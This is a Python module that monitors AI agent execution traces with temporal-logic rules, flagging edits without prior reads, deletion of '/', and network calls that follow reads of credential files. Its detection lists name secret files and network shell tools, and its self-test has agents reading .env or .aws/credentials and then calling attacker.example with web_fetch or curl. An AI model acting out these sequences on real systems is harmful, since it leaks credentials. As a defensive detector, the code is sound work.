"""formalverify — Linear Temporal Logic (LTL) & Execution Trace Safety Verifier.

Provides event-level LTL monitors over execution traces:
  * ``NEVER`` (G ¬p), ``PRECEDES``, ``RESPONDS_TO`` (F after trigger),
  * ``ALWAYS`` (G p), ``EVENTUALLY`` (F p), ``UNTIL`` (p U q), ``NEXT`` (X p),
  * ``NEVER_SEQUENCE`` taint analysis (sensitive read followed by network call).

Rule predicates that raise are treated as violations (fail closed) instead
of silently passing. Malformed traces never raise.

Self-test: ``python3 -m fullagent.enforcex.formalverify``
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence

__all__ = [
    "TraceEvent",
    "TemporalRule",
    "Counterexample",
    "TraceVerificationReport",
    "FormalVerifier",
    "normalize_trace",
    "default_agent_safety_rules",
    "verify_trace",
    "make_never_rule",
    "make_precedes_rule",
    "make_responds_to_rule",
    "make_always_rule",
    "make_eventually_rule",
    "make_until_rule",
    "make_next_rule",
]

# hard cap so a hostile trace cannot pin the verifier
MAX_TRACE_EVENTS = 100000


@dataclass
class TraceEvent:
    step: int
    kind: str
    target: str = ""
    status: str = "done"
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "step": self.step,
            "kind": self.kind,
            "target": self.target,
            "status": self.status,
            "metadata": dict(self.metadata or {}),
        }


@dataclass
class Counterexample:
    rule_id: str
    operator: str
    step: int
    message: str
    witness: List[Dict[str, Any]] = field(default_factory=list)
    severity: str = "high"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "rule_id": self.rule_id,
            "category": "formal_ltl",
            "operator": self.operator,
            "step": self.step,
            "severity": self.severity,
            "message": self.message,
            "evidence": f"step {self.step}",
            "witness": list(self.witness),
        }


@dataclass
class TraceVerificationReport:
    verified: bool = True
    steps_checked: int = 0
    rules_checked: int = 0
    counterexamples: List[Counterexample] = field(default_factory=list)
    score: float = 100.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "verified": self.verified,
            "steps_checked": self.steps_checked,
            "rules_checked": self.rules_checked,
            "counterexamples_count": len(self.counterexamples),
            "counterexamples": [c.to_dict() for c in self.counterexamples],
            "score": round(self.score, 2),
        }


@dataclass
class TemporalRule:
    rule_id: str
    operator: str
    description: str
    severity: str = "high"
    check_fn: Optional[Callable[[List[TraceEvent]], Optional[Counterexample]]] = None


def normalize_trace(raw_events: Sequence[Any]) -> List[TraceEvent]:
    out: List[TraceEvent] = []
    if raw_events is None or isinstance(raw_events, (str, bytes)):
        return out
    try:
        iterator = enumerate(raw_events)
    except TypeError:
        return out
    for idx, item in iterator:
        if idx >= MAX_TRACE_EVENTS:
            break
        if isinstance(item, TraceEvent):
            out.append(
                TraceEvent(
                    step=idx,
                    kind=str(item.kind or "unknown"),
                    target=str(item.target or ""),
                    status=str(item.status or "done"),
                    metadata=dict(item.metadata) if isinstance(
                        getattr(item, "metadata", None), dict) else {},
                )
            )
        elif isinstance(item, dict):
            kind = str(item.get("kind") or item.get("name") or item.get("type") or "unknown")
            args = item.get("args") if isinstance(item.get("args"), dict) else {}
            target = str(
                item.get("target")
                or args.get("path")
                or args.get("url")
                or args.get("command")
                or ""
            )
            status = str(item.get("status") or "done")
            out.append(TraceEvent(step=idx, kind=kind, target=target, status=status, metadata=dict(item)))
        elif isinstance(item, (tuple, list)) and len(item) >= 1:
            kind = str(item[0])
            target = str(item[1]) if len(item) >= 2 else ""
            out.append(TraceEvent(step=idx, kind=kind, target=target))
        else:
            out.append(TraceEvent(step=idx, kind=str(item)))
    return out


def make_never_rule(
    rule_id: str,
    description: str,
    predicate: Callable[[TraceEvent], bool],
    *,
    severity: str = "critical",
) -> TemporalRule:
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        for ev in trace:
            if predicate(ev):
                return Counterexample(
                    rule_id=rule_id,
                    operator="NEVER",
                    step=ev.step,
                    message=f"{description} (violated at step {ev.step}: {ev.kind} {ev.target})",
                    witness=[ev.to_dict()],
                    severity=severity,
                )
        return None

    return TemporalRule(rule_id=rule_id, operator="NEVER", description=description, severity=severity, check_fn=_check)


def make_precedes_rule(
    rule_id: str,
    description: str,
    pre_match: Callable[[TraceEvent], bool],
    action_match: Callable[[TraceEvent], bool],
    *,
    same_target: bool = False,
    severity: str = "high",
) -> TemporalRule:
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        seen_all = False
        seen_targets = set()
        for idx, ev in enumerate(trace):
            if pre_match(ev):
                seen_all = True
                if ev.target:
                    seen_targets.add(ev.target)
            if action_match(ev):
                ok = (ev.target in seen_targets) if (same_target and ev.target) else seen_all
                if not ok:
                    return Counterexample(
                        rule_id=rule_id,
                        operator="PRECEDES",
                        step=ev.step,
                        message=f"{description} (violated at step {ev.step}: '{ev.kind}' on '{ev.target}')",
                        witness=[e.to_dict() for e in trace[max(0, idx - 2):idx + 1]],
                        severity=severity,
                    )
        return None

    return TemporalRule(rule_id=rule_id, operator="PRECEDES", description=description, severity=severity, check_fn=_check)


def make_responds_to_rule(
    rule_id: str,
    description: str,
    trigger_match: Callable[[TraceEvent], bool],
    response_match: Callable[[TraceEvent], bool],
    *,
    severity: str = "medium",
) -> TemporalRule:
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        n = len(trace)
        # suffix-any table: O(n) instead of O(n^2) slicing
        suffix_any = [False] * (n + 1)
        matches = [bool(response_match(ev)) for ev in trace]
        for i in range(n - 1, -1, -1):
            suffix_any[i] = suffix_any[i + 1] or matches[i]
        for i, ev in enumerate(trace):
            if trigger_match(ev) and not suffix_any[i + 1]:
                return Counterexample(
                    rule_id=rule_id,
                    operator="RESPONDS_TO",
                    step=ev.step,
                    message=f"{description} (trigger '{ev.kind}' at step {ev.step} unfulfilled)",
                    witness=[e.to_dict() for e in trace[i:]],
                    severity=severity,
                )
        return None

    return TemporalRule(rule_id=rule_id, operator="RESPONDS_TO", description=description, severity=severity, check_fn=_check)


def make_always_rule(
    rule_id: str,
    description: str,
    predicate: Callable[[TraceEvent], bool],
    *,
    severity: str = "high",
) -> TemporalRule:
    """G p: every event in the trace must satisfy ``predicate``."""
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        for ev in trace:
            if not predicate(ev):
                return Counterexample(
                    rule_id=rule_id,
                    operator="ALWAYS",
                    step=ev.step,
                    message=f"{description} (invariant broken at step {ev.step}: {ev.kind} {ev.target})",
                    witness=[ev.to_dict()],
                    severity=severity,
                )
        return None

    return TemporalRule(rule_id=rule_id, operator="ALWAYS", description=description, severity=severity, check_fn=_check)


def make_eventually_rule(
    rule_id: str,
    description: str,
    predicate: Callable[[TraceEvent], bool],
    *,
    severity: str = "high",
) -> TemporalRule:
    """F p: at least one event in the trace must satisfy ``predicate``."""
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        if any(predicate(ev) for ev in trace):
            return None
        return Counterexample(
            rule_id=rule_id,
            operator="EVENTUALLY",
            step=trace[-1].step if trace else 0,
            message=f"{description} (obligation never fulfilled)",
            witness=[e.to_dict() for e in trace[-3:]],
            severity=severity,
        )

    return TemporalRule(rule_id=rule_id, operator="EVENTUALLY", description=description, severity=severity, check_fn=_check)


def make_until_rule(
    rule_id: str,
    description: str,
    invariant_match: Callable[[TraceEvent], bool],
    until_match: Callable[[TraceEvent], bool],
    *,
    severity: str = "high",
) -> TemporalRule:
    """p U q: p holds until the first q, and q eventually occurs."""
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        for idx, ev in enumerate(trace):
            if until_match(ev):
                return None
            if not invariant_match(ev):
                return Counterexample(
                    rule_id=rule_id,
                    operator="UNTIL",
                    step=ev.step,
                    message=f"{description} (invariant broken at step {ev.step} before the until-condition)",
                    witness=[e.to_dict() for e in trace[max(0, idx - 2):idx + 1]],
                    severity=severity,
                )
        return Counterexample(
            rule_id=rule_id,
            operator="UNTIL",
            step=trace[-1].step if trace else 0,
            message=f"{description} (until-condition never occurred)",
            witness=[e.to_dict() for e in trace[-3:]],
            severity=severity,
        )

    return TemporalRule(rule_id=rule_id, operator="UNTIL", description=description, severity=severity, check_fn=_check)


def make_next_rule(
    rule_id: str,
    description: str,
    trigger_match: Callable[[TraceEvent], bool],
    next_match: Callable[[TraceEvent], bool],
    *,
    severity: str = "high",
) -> TemporalRule:
    """X p after every trigger: the immediately following event must match."""
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        for idx, ev in enumerate(trace):
            if not trigger_match(ev):
                continue
            if idx + 1 < len(trace) and next_match(trace[idx + 1]):
                continue
            nxt = trace[idx + 1] if idx + 1 < len(trace) else None
            return Counterexample(
                rule_id=rule_id,
                operator="NEXT",
                step=ev.step,
                message=(f"{description} (step {ev.step} trigger not followed "
                         f"by a matching next event)"),
                witness=[ev.to_dict()] + ([nxt.to_dict()] if nxt else []),
                severity=severity,
            )
        return None

    return TemporalRule(rule_id=rule_id, operator="NEXT", description=description, severity=severity, check_fn=_check)


_SECRET_MARKERS: tuple = (
    ".env", "id_rsa", "id_ed25519", "id_dsa", "id_ecdsa", "credentials",
    "shadow", "secret", "token", "passwd", "private_key", "kubeconfig",
    ".npmrc", ".pypirc", ".netrc", ".git-credentials", "secrets.yaml",
    "secrets.yml", "service_account.json",
)
_SECRET_RE = re.compile(
    r"(?<![a-z0-9])(?:" +
    "|".join(re.escape(m) for m in _SECRET_MARKERS) +
    r")(?![a-z0-9])"
)
_NETWORK_KINDS = frozenset((
    "web_fetch", "web_search", "BrowserOpen", "browseropen", "send_email",
    "http_request", "post_request", "upload", "curl", "wget",
))
_NETWORK_CMD_RE = re.compile(r"\b(?:curl|wget|nc|netcat|scp|ssh|ftp)\b")


def _is_secret_target(target: str) -> bool:
    return bool(_SECRET_RE.search(target.lower()))


def _is_network_event(ev: TraceEvent) -> bool:
    if ev.kind in _NETWORK_KINDS or ev.kind.lower() in _NETWORK_KINDS:
        return True
    if ev.kind in ("run_command", "shell", "bash", "exec"):
        return bool(_NETWORK_CMD_RE.search(ev.target.lower()))
    return False


def _check_no_secret_exfil(trace: List[TraceEvent]) -> Optional[Counterexample]:
    secret_step: Optional[TraceEvent] = None
    for ev in trace:
        if ev.kind in ("read_file", "run_command") and _is_secret_target(ev.target):
            secret_step = ev
        elif secret_step is not None and _is_network_event(ev):
            return Counterexample(
                rule_id="LTL-NO-SECRET-EXFIL",
                operator="NEVER_SEQUENCE",
                step=ev.step,
                message=(
                    f"Potential data exfiltration: network tool '{ev.kind}' at step {ev.step} "
                    f"followed sensitive read of '{secret_step.target}' at step {secret_step.step}"
                ),
                witness=[secret_step.to_dict(), ev.to_dict()],
                severity="critical",
            )
    return None


def default_agent_safety_rules() -> List[TemporalRule]:
    return [
        make_precedes_rule(
            "LTL-READ-BEFORE-EDIT",
            "A file must be read (read_file) before it is edited in-place (edit_file)",
            pre_match=lambda e: e.kind in ("read_file", "view_file"),
            action_match=lambda e: e.kind in ("edit_file", "MultiEdit", "multiedit"),
            same_target=True,
            severity="high",
        ),
        TemporalRule(
            rule_id="LTL-NO-SECRET-EXFIL",
            operator="NEVER_SEQUENCE",
            description="External network calls must never follow access to sensitive credential files",
            severity="critical",
            check_fn=_check_no_secret_exfil,
        ),
        make_never_rule(
            "LTL-NEVER-ROOT-DELETE",
            "Never invoke delete_path on '/' or '~'",
            predicate=lambda e: e.kind == "delete_path" and e.target.strip() in ("/", "~", "/*"),
            severity="critical",
        ),
    ]


class FormalVerifier:
    def __init__(self, rules: Optional[Sequence[TemporalRule]] = None) -> None:
        self.rules: List[TemporalRule] = list(rules) if rules is not None else default_agent_safety_rules()

    def verify(self, raw_trace: Sequence[Any]) -> TraceVerificationReport:
        trace = normalize_trace(raw_trace)
        cex: List[Counterexample] = []
        for rule in self.rules:
            if not callable(rule.check_fn):
                continue
            try:
                hit = rule.check_fn(trace)
                if hit is not None:
                    cex.append(hit)
            except Exception as exc:
                # fail closed: a crashing monitor must not silently pass
                cex.append(Counterexample(
                    rule_id=f"{rule.rule_id}-MONITOR-ERROR",
                    operator=str(rule.operator or "MONITOR"),
                    step=0,
                    message=(f"Rule monitor failed ({type(exc).__name__}); "
                             f"treated as a violation"),
                    witness=[],
                    severity=rule.severity or "high",
                ))
        weights = {"critical": 45.0, "high": 25.0, "medium": 12.0, "low": 5.0}
        score = max(0.0, 100.0 - sum(weights.get(c.severity, 15.0) for c in cex))
        return TraceVerificationReport(
            verified=len(cex) == 0,
            steps_checked=len(trace),
            rules_checked=len(self.rules),
            counterexamples=cex,
            score=score,
        )


def verify_trace(raw_trace: Sequence[Any], rules: Optional[Sequence[TemporalRule]] = None) -> TraceVerificationReport:
    return FormalVerifier(rules=rules).verify(raw_trace)


def _self_test() -> int:
    good_trace = [
        {"kind": "read_file", "target": "app.py"},
        {"kind": "edit_file", "target": "app.py"},
        {"kind": "run_command", "target": "pytest"},
    ]
    r_ok = verify_trace(good_trace)
    assert r_ok.verified and r_ok.score == 100.0, r_ok.to_dict()

    bad_edit = [
        {"kind": "read_file", "target": "other.py"},
        {"kind": "edit_file", "target": "app.py"},
    ]
    r_bad1 = verify_trace(bad_edit)
    assert not r_bad1.verified
    assert any(c.rule_id == "LTL-READ-BEFORE-EDIT" for c in r_bad1.counterexamples)

    exfil_trace = [
        {"kind": "read_file", "target": "/app/.env"},
        {"kind": "web_fetch", "target": "https://attacker.example/collect?d=1"},
    ]
    r_bad2 = verify_trace(exfil_trace)
    assert not r_bad2.verified
    assert any(c.rule_id == "LTL-NO-SECRET-EXFIL" for c in r_bad2.counterexamples)

    resp_rule = make_responds_to_rule(
        "LTL-LOCK-UNLOCK",
        "acquire_lock must be followed by release_lock",
        trigger_match=lambda e: e.kind == "acquire_lock",
        response_match=lambda e: e.kind == "release_lock",
    )
    v_custom = FormalVerifier([resp_rule])
    assert not v_custom.verify([("acquire_lock", "db")]).verified
    assert v_custom.verify([("acquire_lock", "db"), ("release_lock", "db")]).verified

    # 1. ALWAYS (G p): every event must satisfy the invariant
    always = FormalVerifier([make_always_rule(
        "LTL-ALWAYS-READONLY", "every action must be read-only",
        predicate=lambda e: e.kind.startswith("read"))])
    assert always.verify([("read_file", "a"), ("read_url", "b")]).verified
    r_always = always.verify([("read_file", "a"), ("write_file", "b")])
    assert not r_always.verified and r_always.counterexamples[0].operator == "ALWAYS"

    # 2. EVENTUALLY (F p): obligation must be met somewhere
    eventually = FormalVerifier([make_eventually_rule(
        "LTL-EVENTUALLY-BACKUP", "a backup must happen",
        predicate=lambda e: e.kind == "backup")])
    assert eventually.verify([("read_file", "a"), ("backup", "")]).verified
    assert not eventually.verify([("read_file", "a")]).verified
    assert not eventually.verify([]).verified

    # 3. UNTIL (p U q): invariant before the first q, q required
    until = FormalVerifier([make_until_rule(
        "LTL-UNTIL-QUIET", "stay quiet until shutdown",
        invariant_match=lambda e: e.kind != "exfil",
        until_match=lambda e: e.kind == "shutdown")])
    assert until.verify([("read_file", "a"), ("shutdown", "")]).verified
    assert not until.verify([("exfil", "x"), ("shutdown", "")]).verified
    assert not until.verify([("read_file", "a")]).verified

    # 4. NEXT (X p): every trigger must be immediately followed by p
    nxt = FormalVerifier([make_next_rule(
        "LTL-NEXT-READ", "open must be followed by read",
        trigger_match=lambda e: e.kind == "open",
        next_match=lambda e: e.kind == "read")])
    assert nxt.verify([("open", "f"), ("read", "f")]).verified
    assert not nxt.verify([("open", "f")]).verified
    assert not nxt.verify([("open", "f"), ("write", "f")]).verified

    # 5. a crashing monitor fails closed instead of silently passing
    def _boom(_e: TraceEvent) -> bool:
        raise RuntimeError("monitor bug")
    v_boom = FormalVerifier([make_never_rule("LTL-BOOM", "boom", _boom)])
    r_boom = v_boom.verify([("read_file", "a")])
    assert not r_boom.verified
    assert r_boom.counterexamples[0].rule_id.endswith("MONITOR-ERROR")

    # 6. malformed traces never raise
    assert verify_trace(None).steps_checked == 0
    assert verify_trace(42).steps_checked == 0
    assert verify_trace("a string").steps_checked == 0
    weird = [None, 7, {"kind": None}, TraceEvent(0, "read_file", metadata=None)]
    r_weird = verify_trace(weird)
    assert r_weird.steps_checked == 4

    # 7. secret-marker matching uses token boundaries (no tokenizer false positive)
    proxy = [{"kind": "read_file", "target": "/app/tokenizer.py"},
             {"kind": "web_fetch", "target": "https://example.com/"}]
    assert verify_trace(proxy).verified
    creds = [{"kind": "read_file", "target": "/home/u/.aws/credentials"},
             {"kind": "run_command", "target": "curl https://attacker.example/x"}]
    r_creds = verify_trace(creds)
    assert not r_creds.verified
    assert any(c.rule_id == "LTL-NO-SECRET-EXFIL" for c in r_creds.counterexamples)

    # 8. responses-to monitor is linear on many triggers (no O(n^2) blowup)
    many = [("acquire_lock", "db")] * 3000 + [("release_lock", "db")]
    assert FormalVerifier([resp_rule]).verify(many).verified

    # 9. oversized traces are capped deterministically
    huge = [{"kind": "read_file", "target": "a"}] * (MAX_TRACE_EVENTS + 10)
    r_huge = verify_trace(huge)
    assert r_huge.steps_checked == MAX_TRACE_EVENTS and r_huge.verified

    print("formalverify._self_test: OK PASS (NEVER, PRECEDES, RESPONDS_TO, ALWAYS, EVENTUALLY, "
          "UNTIL, NEXT, taint exfil verified, fail-closed monitors)")
    return 0


if __name__ == "__main__":
    raise SystemExit(_self_test())
